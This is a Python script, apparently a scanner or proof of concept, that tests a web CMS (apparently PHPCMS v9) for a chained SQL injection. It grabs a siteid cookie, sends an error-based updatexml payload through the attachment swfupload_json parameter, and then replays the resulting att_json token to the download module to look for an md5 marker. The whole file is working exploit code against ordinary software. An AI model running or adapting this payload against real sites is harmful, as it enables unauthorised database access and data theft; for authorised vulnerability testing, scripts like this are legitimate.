import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=str(randomInt(1000, 2000))
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=wap&c=index&a=init&siteid=1"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
		try:
			siteid=re.findall("siteid=(.*)",response.headers["set-cookie"])[0]
		except:
			siteid=''
	else:
		siteid=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%25*27%20and%20updatexml%281%2Cconcat%281%2C%28md5%28"+f1+"%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
	body=f"userid_flash={siteid}"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
		try:
			att_json=re.findall("att_json=(.*)",response.headers["set-cookie"])[0]
		except:
			att_json=''
	else:
		att_json=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"index.php?m=content&c=down&a=init&a_k={att_json}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and substr(md5(str(f1).encode()).hexdigest(),6,20) in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
